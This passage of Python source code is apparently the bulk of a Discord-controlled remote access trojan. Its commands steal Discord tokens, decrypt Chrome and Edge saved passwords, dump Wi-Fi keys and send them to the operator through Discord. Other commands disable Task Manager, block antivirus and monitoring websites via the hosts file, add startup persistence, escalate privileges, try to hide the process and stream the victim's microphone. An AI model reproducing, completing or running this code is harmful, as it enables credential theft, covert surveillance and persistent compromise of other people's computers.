    if not is_admin():
        await ctx.send("This command requires administrator privileges. Please run the bot as an administrator.")
        return
    
    try:
        # Enable the Windows Recovery Environment (WinRE)
        result = subprocess.run(["reagentc", "/enable"], capture_output=True, text=True, shell=True)
        
        # Check the result
        if result.returncode == 0:
            await ctx.send("Factory reset has been successfully enabled!")
        else:
            await ctx.send(f"Failed to enable factory reset. Error: {result.stderr}")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def reagentcdisable(ctx):
    """Disables the factory reset option by disabling WinRE (both from Settings and on boot)."""
    if not is_admin():
        await ctx.send("This command requires administrator privileges. Please run the bot as an administrator.")
        return
    
    try:
        # Disable the Windows Recovery Environment (WinRE)
        result = subprocess.run(["reagentc", "/disable"], capture_output=True, text=True, shell=True)
        
        # Check the result
        if result.returncode == 0:
            await ctx.send("Factory reset has been successfully disabled!")
        else:
            await ctx.send(f"Failed to disable factory reset. Error: {result.stderr}")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name="block-website")
async def block_website(ctx, website: str):
    """Block a website by adding it to the system's hosts file."""
    # Ensure the website is not already blocked (optional)
    hosts_path = "/etc/hosts"  # Linux or MacOS path
    if os.name == 'nt':  # If on Windows
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"

    try:
        # Open the hosts file in append mode
        with open(hosts_path, "a") as hosts_file:
            # Add the entry to block the website
            hosts_file.write(f"127.0.0.1 {website}\n")
        
        await ctx.send(f"Website {website} has been blocked.")
    except PermissionError:
        # If the bot doesn't have permission to modify the hosts file
        await ctx.send("Permission denied. Ensure the bot is running with admin privileges.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def jumpscare(ctx):
    try:
        # Download the jumpscare video
        video_url = "https://github.com/AizenWo/Python/releases/download/Jumpscare/Jumpscare.mp4"
        video_path = "Jumpscare.mp4"
        await ctx.send("Starting jumpscare...")

        response = requests.get(video_url, stream=True)
        if response.status_code == 200:
            with open(video_path, "wb") as video_file:
                for chunk in response.iter_content(chunk_size=1024):
                    video_file.write(chunk)
        else:
            await ctx.send("Failed to download jumpscare video.")
            return

        await ctx.send("Jumpscare video downloaded successfully!")

        # Set the system volume to 100%
        await ctx.send("Maximizing volume...")
        if os.name == "nt":  # For Windows
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            from comtypes import CLSCTX_ALL

            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None
            )
            volume = interface.QueryInterface(IAudioEndpointVolume)
            volume.SetMasterVolumeLevelScalar(1.0, None)  # Set volume to 100%
        elif os.name == "posix":  # For macOS/Linux
            subprocess.run("osascript -e 'set volume output volume 100'", shell=True)

        # Play the video using the system's default video player
        await ctx.send("Playing jumpscare video...")
        player_process = None
        hwnd = None

        if os.name == "nt":  # For Windows
            # Use the default video player (e.g., Windows Media Player)
            player_process = subprocess.Popen(["start", video_path], shell=True)

            # Wait briefly to ensure the video player starts
            time.sleep(2)

            # Find and make the window topmost
            for _ in range(10):  # Retry for a few seconds to find the window
                hwnd = ctypes.windll.user32.FindWindowW(None, video_path)
                if hwnd:
                    ctypes.windll.user32.SetWindowPos(
                        hwnd, -1, 0, 0, 0, 0, 0x0001 | 0x0002
                    )  # Set topmost
                    break
                time.sleep(0.5)

            if not hwnd:
                await ctx.send("Failed to make video topmost.")
        elif os.name == "posix":  # For macOS/Linux
            # Use `xdg-open` for Linux or `open` for macOS
            opener = "xdg-open" if "linux" in os.sys.platform else "open"
            player_process = subprocess.Popen([opener, video_path])

        # Let the video play for 10 seconds
        await asyncio.sleep(10)

        # Close the video player
        if player_process:
            player_process.terminate()
        await ctx.send("Jumpscare complete!")

        # Clean up the downloaded video
        os.remove(video_path)

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

class grab_discord():
    def initialize(raw_data):
        return fetch_tokens().upload(raw_data)

class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            # Add other paths as needed...
        }

        for name, path in paths.items():
            if not os.path.exists(path): continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'): continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                    
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})
        if r.status_code == 200: return True
        return False
    
    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16]
        
        try:
            # Try decoding as UTF-8
            return decrypted_pass.decode('utf-8')
        except UnicodeDecodeError:
            # If UTF-8 decoding fails, attempt with another encoding (e.g., ISO-8859-1)
            return decrypted_pass.decode('iso-8859-1', errors='ignore')  # Fallback to ISO-8859-1 or ignore errors

    def get_master_key(self, path: str) -> str:
        if not os.path.exists(path): return
        if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return
        with open(path, "r", encoding="utf-8") as f: c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens
    
    def upload(self, raw_data):
        if not self.tokens:
            return
        final_to_return = []
        for token in self.tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            
            embed = Embed(title=f"{username} ({user_id})", color=0xFF69B4)
            embed.set_thumbnail(url=avatar)
            embed.add_field(name="📜 Token:", value=f"```{token}```", inline=False)
            final_to_return.append(embed)
        
        return final_to_return
    
@bot.command()
async def token(ctx):
    raw_data = None  # Set raw_data to your preferred value if needed
    fetched_data = fetch_tokens().upload(raw_data)
    if fetched_data:
        for embed in fetched_data:
            await ctx.send(embed=embed)
    else:
        await ctx.send("No tokens found.")

@bot.command()
async def wallpaper(ctx):
    # Check if an attachment was provided
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach an image to set as the wallpaper!")
        return

    # Get the attachment (assume the first one if multiple attachments)
    attachment = ctx.message.attachments[0]
    file_extension = os.path.splitext(attachment.filename)[1].lower()

    # Check if the attachment is an image
    if file_extension not in ['.jpg', '.jpeg', '.png', '.bmp']:
        await ctx.send("The attachment must be an image (.jpg, .jpeg, .png, .bmp).")
        return

    try:
        # Download the image
        image_path = os.path.join(os.getcwd(), attachment.filename)
        await attachment.save(image_path)

        # Set the image as the wallpaper (Windows example using ctypes)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)

        await ctx.send(f"The wallpaper has been changed successfully!")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def message(ctx, *, text: str):
    # Create a Tkinter window (it won't be visible)
    root = tk.Tk()
    root.withdraw()  # Hide the main window

    # Show the message box with the text passed by the user
    messagebox.showinfo("Error", text)

    await ctx.send(f"Message box displayed with your text: '{text}'")

mouse_trolling = False
keyboard_trolling = False

def random_mouse_move():
    while mouse_trolling:
        # Get screen size
        screen_width, screen_height = pyautogui.size()
        # Move mouse to a random position on the screen
        random_x = random.randint(0, screen_width)
        random_y = random.randint(0, screen_height)
        pyautogui.moveTo(random_x, random_y, duration=random.uniform(0.1, 0.5))  # Fast random movement
        time.sleep(random.uniform(0.5, 1.5))  # Random delay between movements

def random_typing():
    while keyboard_trolling:
        # Random characters to type
        random_text = ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=random.randint(5, 10)))
        keyboard.write(random_text)
        time.sleep(random.uniform(0.5, 1.5))  # Random delay between typing

@bot.command()
async def trollmouse(ctx):
    global mouse_trolling
    if not mouse_trolling:
        mouse_trolling = True
        # Start mouse trolling in a separate thread
        threading.Thread(target=random_mouse_move, daemon=True).start()
        await ctx.send("Mouse trolling started! The mouse will move randomly.")
    else:
        await ctx.send("Mouse trolling is already running.")

@bot.command()
async def trollkeyboard(ctx):
    global keyboard_trolling
    if not keyboard_trolling:
        keyboard_trolling = True
        # Start keyboard trolling in a separate thread
        threading.Thread(target=random_typing, daemon=True).start()
        await ctx.send("Keyboard trolling started! The bot will type random things.")
    else:
        await ctx.send("Keyboard trolling is already running.")

@bot.command()
async def trollstop(ctx):
    global mouse_trolling, keyboard_trolling
    mouse_trolling = False
    keyboard_trolling = False
    await ctx.send("Trolls have been stopped. Mouse and keyboard trolling are now disabled.")

@bot.command()
async def disabletaskmanager(ctx):
    print("Disabling Task Manager...")
    
    # Command to disable Task Manager by modifying the registry
    try:
        # Disabling Task Manager using the registry key
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)
        await ctx.send("Task Manager has been permanently disabled.")
    except Exception as e:
        await ctx.send(f"Error: {e}")
        print(f"Error: {e}")

@bot.command()
async def enabletaskmanager(ctx):
    print("Enabling Task Manager...")
    
    # Command to enable Task Manager by removing the registry key
    try:
        # Enabling Task Manager by removing the registry key
        subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f', shell=True)
        await ctx.send("Task Manager has been enabled again.")
    except Exception as e:
        await ctx.send(f"Error: {e}")
        print(f"Error: {e}")

@bot.command()
async def blockavsite(ctx):
    """Blocks a range of antivirus, process monitors, and system informer websites by modifying the hosts file."""
    if not is_admin():
        await ctx.send("This command requires administrator privileges. Please run the bot as an administrator.")
        return
    
    # List of common antivirus websites (expand this list with more if necessary)
    antivirus_sites = [
        "www.avast.com", "www.avg.com", "www.malwarebytes.com", "www.bitdefender.com", 
        "www.norton.com", "www.kaspersky.com", "www.mcafee.com", "www.trendmicro.com",
        "www.webroot.com", "www.sophos.com", "www.f-secure.com", "www.360.cn",
        "www.comodo.com", "www.pandasecurity.com", "www.eSET.com", "www.sentinelone.com",
        "www.crowdstrike.com", "www.windowsdefender.com", "www.zonealarm.com"
    ]
    
    # List of process monitoring websites (expand as needed)
    process_monitor_domains = [
        "www.processhacker.com", "www.sysinternals.com", "www.taskmgr.com", "www.perfdump.com"
    ]
    
    # List of system informer websites (expand as needed)
    system_informer_sites = [
        "www.hwmonitor.com", "www.cpuid.com", "www.speccy.com", "www.cpubenchmark.net", 
        "www.systeminfo.com", "www.passmark.com", "www.memtest86.com"
    ]
    
    try:
        # Open the hosts file with administrative privileges
        hosts_file = r"C:\Windows\System32\drivers\etc\hosts"
        
        # Append all sites to the hosts file (loop through each list)
        with open(hosts_file, "a") as file:
            # Block antivirus sites
            for site in antivirus_sites:
                file.write(f"127.0.0.1 {site}\n")
            
            # Block process monitor sites
            for domain in process_monitor_domains:
                file.write(f"127.0.0.1 {domain}\n")
            
            # Block system informer sites
            for site in system_informer_sites:
                file.write(f"127.0.0.1 {site}\n")
        
        await ctx.send("Antivirus websites, process monitor websites, and system informer websites have been successfully blocked!")

    except Exception as e:
        await ctx.send(f"An error occurred while blocking websites: {e}")

selected_mic = None
audio_stream = None

# Ensure FFmpeg is installed and available
FFMPEG_EXECUTABLE = "ffmpeg"  # Adjust path if FFmpeg is not in your PATH

# List available microphones
@bot.command()
async def miclist(ctx):
    audio = pyaudio.PyAudio()
    mic_list = [audio.get_device_info_by_index(i)['name'] for i in range(audio.get_device_count())]
    await ctx.send("Available microphones:\n" + "\n".join(f"{i + 1}. {mic}" for i, mic in enumerate(mic_list)))
    audio.terminate()

# Select a microphone
@bot.command()
async def micuse(ctx, *, mic_name):
    global selected_mic
    audio = pyaudio.PyAudio()
    mic_list = [audio.get_device_info_by_index(i)['name'] for i in range(audio.get_device_count())]
    audio.terminate()

    if mic_name in mic_list:
        selected_mic = mic_name
        await ctx.send(f"Microphone set to: {selected_mic}")
    else:
        await ctx.send(f"Microphone '{mic_name}' not found. Use `.miclist` to see available microphones.")

# Join a voice channel and stream microphone audio
@bot.command()
async def mic(ctx, voice_id: int):
    global selected_mic, audio_stream
    if not selected_mic:
        await ctx.send("No microphone selected. Use `.micuse [mic name]` to select a microphone first.")
        return

    # Get the target voice channel by ID
    voice_channel = discord.utils.get(ctx.guild.voice_channels, id=voice_id)
    if not voice_channel:
        await ctx.send("Invalid voice channel ID.")
        return

    # Disconnect if already connected
    if ctx.voice_client:
        await ctx.voice_client.disconnect()

    # Join the voice channel
    vc = await voice_channel.connect()

    # Start streaming microphone audio
    def audio_callback(in_data, frame_count, time_info, status):
        return (in_data, pyaudio.paContinue)

    audio = pyaudio.PyAudio()
    mic_index = None
    for i in range(audio.get_device_count()):
        if audio.get_device_info_by_index(i)['name'] == selected_mic:
            mic_index = i
            break

    if mic_index is None:
        await ctx.send("Microphone not found. Make sure it's still available.")
        await vc.disconnect()
        return

    # Open the microphone stream
    audio_stream = audio.open(
        format=pyaudio.paInt16,
        channels=1,
        rate=48000,
        input=True,
        input_device_index=mic_index,
        frames_per_buffer=1024
    )

    await ctx.send(f"Joined voice channel: {voice_channel.name} and streaming audio from: {selected_mic}")

    # Stream audio to the voice channel
    try:
        while vc.is_connected():
            data = audio_stream.read(1024)
            vc.send_audio_packet(data, encode=False)
            await asyncio.sleep(0.02)
    except Exception as e:
        await ctx.send(f"Error while streaming audio: {e}")
    finally:
        audio_stream.stop_stream()
        audio_stream.close()
        audio.terminate()
        await vc.disconnect()

@bot.command()
async def admin(ctx):
    print("Admin command received!")
    
    if not ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("Restarting with admin privileges...")
        try:
            # Restart the bot with admin privileges
            ctypes.windll.shell32.ShellExecuteW(
                None, 
                "runas", 
                sys.executable,  # Path to the Python interpreter
                " ".join(sys.argv),  # Arguments to the script
                None, 
                0  # Do not show the command window
            )
        except Exception as e:
            await ctx.send(f"Failed to restart with admin privileges: {str(e)}")
    else:
        await ctx.send("Already running as admin.")

@bot.command()
async def rootkit(ctx):
    """Hides the script's process from Task Manager. Admin rights are required."""
    try:
        await ctx.send("🚨 Attempting to hide the process from Task Manager... 🚨")

        if not ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("❌ This command requires admin privileges. Restarting with admin... 🔑")
            try:
                # Restart the bot with admin privileges using pythonw.exe to avoid opening a command window
                ctypes.windll.shell32.ShellExecuteW(
                    None,
                    "runas",
                    sys.executable.replace("python.exe", "pythonw.exe"),  # Use pythonw.exe to prevent cmd window
                    " ".join(sys.argv),  # Arguments to the script
                    None,
                    0  # Do not show the command window
                )
            except Exception as e:
                await ctx.send(f"❌ Failed to restart with admin privileges: {str(e)}")
            return  # Exit the function since we are restarting the bot

        else:
            # Proceed with hiding the process
            if os.name == "nt":  # For Windows
                # Access the NtSetInformationProcess function from ntdll.dll
                NtSetInformationProcess = ctypes.windll.ntdll.NtSetInformationProcess
                GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
                PROCESS_INFORMATION_CLASS = 0x1d  # ProcessBasicInformation
                ProcessBasicInformation = 0x200  # This hides the process

                hProcess = GetCurrentProcess()  # Get the handle of the current process
                # Call NtSetInformationProcess to hide the process from Task Manager
                status = NtSetInformationProcess(hProcess, PROCESS_INFORMATION_CLASS, ctypes.byref(ctypes.c_ulong(ProcessBasicInformation)), ctypes.sizeof(ctypes.c_ulong))

                if status == 0:  # STATUS_SUCCESS
                    await ctx.send("✅ The process is now hidden from Task Manager.")
                    # Hide the script itself by terminating the command window or script window
                    sys.exit()  # Exit the script to make it fully disappear from Task Manager
                else:
                    await ctx.send("❌ Failed to hide the process. Admin rights might be missing.")
            else:
                await ctx.send("❌ This operation is only supported on Windows.")
                
    except Exception as e:
        await ctx.send(f"❌ An error occurred while hiding the process: {e}")

@bot.command()
async def grabpass(ctx):
    """Grabs the saved passwords from Chrome and Edge browsers."""

    def convert_date(ft):
        utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
        return utc.strftime('%Y-%m-%d %H:%M:%S')

    def get_master_key():
        try:
            with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
        except: exit()
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password_edge(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e: return "Edge < 80"

    def get_passwords_edge():
        master_key = get_master_key()
        login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
        try: shutil.copy2(login_db, "Loginvault.db")
        except: print("Edge browser not detected!")
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            result = {}
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password_edge(encrypted_password, master_key)
                if username != "" or decrypted_password != "":
                    result[url] = [username, decrypted_password]
        except: pass

        cursor.close(); conn.close()
        try: os.remove("Loginvault.db")
        except Exception as e: print(e); pass

    def get_chrome_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key():
        try:
            local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except: time.sleep(1)

    def decrypt_password_chrome(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try: return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except: return ""

    def main():
        key = get_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
        file_name = "ChromeData.db"
        shutil.copyfile(db_path, file_name)
        db = sqlite3.connect(file_name)
        cursor = db.cursor()
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        result = {}
        for row in cursor.fetchall():
            action_url = row[1]
            username = row[2]
            password = decrypt_password_chrome(row[3], key)
            if username or password:
                result[action_url] = [username, password]
            else: continue
        cursor.close(); db.close()
        try: os.remove(file_name)
        except: pass
        return result

    def grab_passwords():
        global file_name, nanoseconds
        file_name, nanoseconds = 116444736000000000, 10000000
        result = {}
        try: result = main()
        except: time.sleep(1)

        try: 
            result2 = get_passwords_edge()
            for i in result2.keys():
                result[i] = result2[i]
        except: time.sleep(1)

        return result

    # Execute the function and collect passwords
    passwords = grab_passwords()

    # Prepare the text file content
    password_file_content = ""
    if passwords:
        for url, creds in passwords.items():
            password_file_content += f"URL: {url}\nUsername: {creds[0]}\nPassword: {creds[1]}\n\n"
    else:
        password_file_content = "No passwords were retrieved from the browsers.\n"

    # Save the passwords to a text file
    file_path = "grabbed_passwords.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(password_file_content)

    # Send the text file as an attachment
    with open(file_path, "rb") as file:
        await ctx.send("Here are the grabbed passwords:", file=discord.File(file, file_path))

    # Clean up the file after sending
    os.remove(file_path)

@bot.command()
async def grabwifi(ctx):
    """Grabs and displays all Wi-Fi passwords in a beautiful pink embed."""
    try:
        await ctx.send("✨ Fetching saved Wi-Fi passwords... 🔐")

        if os.name != "nt":
            await ctx.send("❌ This command only works on Windows!")
            return

        # Run the netsh command to list all Wi-Fi profiles
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        profiles = re.findall(r"All User Profile\s*:\s*(.*)", result.stdout)

        if not profiles:
            await ctx.send("😕 No Wi-Fi profiles found.")
            return

        wifi_details = []
        for profile in profiles:
            # Run the netsh command to get the password for each profile
            details = subprocess.run(
                ["netsh", "wlan", "show", "profile", profile.strip(), "key=clear"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            password = re.search(r"Key Content\s*:\s*(.*)", details.stdout)
            password = password.group(1) if password else "⚠️ No password"

            wifi_details.append(f"🌸 **{profile.strip()}**\n🔑 `{password}`\n")

        # Format the details into an embed
        embed = discord.Embed(
            title="🌷 Saved Wi-Fi Passwords 🌷",
            description="\n".join(wifi_details),
            color=discord.Color.from_rgb(255, 182, 193)  # A pastel pink color
        )
        embed.set_footer(text="✨ Stay responsible! ✨", icon_url="https://i.imgur.com/WQukR35.png")
        embed.set_author(name="Wi-Fi Grabber 💻", icon_url="https://i.imgur.com/KD8MkpL.png")
        embed.set_thumbnail(url="https://i.imgur.com/QOE3q43.png")

        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"❌ An error occurred while fetching passwords: `{e}`")

@bot.command()
async def startup(ctx):
    """Displays options to add a startup item via registry or task manager."""
    await ctx.send(
        "Choose a method to add to startup:\n"
        "[1] Registry\n"
        "[2] Startup Folder"
    )

def add_to_startup_registry(script_path):
    """Add the script to Windows startup using the registry."""
    import winreg as reg
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
        reg.SetValueEx(reg_key, "MyDiscordBot", 0, reg.REG_SZ, script_path)

def add_to_startup_folder(script_path):
    """Add the script to Windows startup using the startup folder."""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        r'Microsoft\Windows\Start Menu\Programs\Startup'
    )
    startup_script_path = os.path.join(startup_folder, os.path.basename(script_path))
    if not os.path.exists(startup_script_path):
        shutil.copy(script_path, startup_script_path)

@bot.command()
async def addstartup(ctx, method: int):
    script_path = os.path.abspath(sys.argv[0])  # Get the path of the current script
    try:
        if method == 1:
            add_to_startup_registry(script_path)
            await ctx.send("Script added to startup via Registry.")
        elif method == 2:
            add_to_startup_folder(script_path)
            await ctx.send("Script added to startup via Startup Folder.")
        else:
            await ctx.send("Invalid option. Please use `.addstart 1` or `.addstart 2`.")
    except Exception as e:
        await ctx.send(f"Failed to add to startup: {e}")

if __name__ == "__main__":
    add_startup_entries()

if __name__ == "__main__":
    # Check if the script is run as a standalone .exe or as a .py script
    if getattr(sys, 'frozen', False):  # If the script is bundled as an executable
        script_name = sys.executable  # Get the name of the executable
    else:
        script_name = sys.argv[0]  # Get the name of the script

bot.run(shine)
